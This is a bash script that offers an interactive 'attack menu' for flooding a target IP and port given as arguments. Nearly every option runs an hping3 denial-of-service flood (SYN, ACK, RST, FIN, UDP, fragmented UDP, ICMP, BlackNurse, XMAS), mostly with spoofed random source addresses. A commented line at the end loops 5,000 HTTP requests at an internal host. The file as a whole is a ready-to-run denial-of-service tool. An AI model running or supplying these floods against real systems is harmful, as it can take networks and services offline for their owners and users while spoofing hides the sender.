echo "*** ATTACK MENU ***"
echo "******************"
echo ""
#IP="10.128.10.50"
IP=$1
if [ "$IP" == "" ]
 then
        echo "Enter Target IP as an Argument"
        exit
fi

PORT=$2
if [ "$PORT" == "" ]
 then
        echo "Enter Target PORT as an Argument"
        exit
fi

echo "Target: $IP:$PORT"
echo ""
#PORT="80"
ATTACK='Please enter your choice: '
options=("SYN-Flood" "PUSH-Flood" "Push/Ack-Flood" "Push/Ack-Flood-TS" "SYN/ACK-Flood" "SYN/ACK-TS-Flood" "ICMP-Flood" "vol-ICMP-Flood" "ACK-Flood" "ACK-Flood-TS" "ACK-Flood-single_source" "RST-Flood" "FIN-Flood" "UDP-Flood" "vol_UDP-Flood" "frag-UDP-Flood" "BN1" "BN2" "BN3" "BN4" "X-MAS-Flood" "Y-MAS-Flood" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "SYN-Flood")
                hping3 -i u1 -S --rand-source -p $PORT $IP --tos 21 --ttl 33 -d 99
                ;;
        "PUSH-Flood")
                hping3 -P -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54
                ;;
        "Push/Ack-Flood")
                hping3 -PA -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54
                ;;
        "Push/Ack-Flood-TS")
                hping3 -PA -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 33 --ttl 74 -d 54 
                ;;
	"SYN/ACK-Flood")
		hping3 -SA -p $PORT $IP --flood --rand-source --tos 32 --ttl 74 -d 54
		;;	
	"SYN/ACK-TS-Flood")
		hping3 -SA --tcp-timestamp -p $PORT $IP --flood --rand-source --tos 32 --ttl 74 -d 54 
		;;
        "ICMP-Flood")
                hping3 --icmp -i u1 $IP --rand-source
                ;;
        "vol-ICMP-Flood")
                hping3 --icmp -i u1 -d 1300 $IP --rand-source
                ;;
        "ACK-Flood")
                hping3 --ack -p $PORT $IP --flood --rand-source --tos 27 --ttl 122 -d 99
                ;;
        "ACK-Flood-TS")
                hping3 --ack -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 27 --ttl 122 -d 99 
                ;;
        "ACK-Flood-single_source")
                hping3 --ack -p $PORT $IP --flood -a 10.103.1.104  --tos 27 --ttl 122 -d 99
                ;;
        "RST-Flood")
                hping3 --rst -p $PORT $IP --flood --rand-source
                ;;
        "FIN-Flood")
                hping3 --fin -p $PORT $IP --flood --rand-source
                ;;
        "UDP-Flood")
                hping3 --flood --rand-source --udp $IP -p $PORT --rand-source
                ;;
        "vol_UDP-Flood")
                hping3 --flood --rand-source --udp $IP -p $PORT --rand-source --data 1400
                ;;
        "frag-UDP-Flood")
                hping3 --flood --rand-source --udp $IP -p $PORT --rand-source -x
                ;;
        "BN1")
                hping3 --icmp -C 3 -K 0 --flood $IP --rand-source
                ;;
        "BN2")
                hping3 --icmp -C 3 -K 3 --flood $IP --rand-source
                ;;
        "BN3")
                hping3 --icmp -C 8 -K 0 --flood $IP --rand-source
                ;;
        "BN4")
                hping3 --icmp -C 8 -K 3 --flood $IP --rand-source
                ;;
        "X-MAS-Flood")
                hping3 --xmas -p $PORT $IP --flood --rand-source
                ;;
        "Y-MAS-Flood")
                hping3 --ymas -p $PORT $IP --flood --rand-source
                ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
# for i in {1..5000}; do curl -v --header "Host: whatever" http://10.128.10.80/whatever$i; done
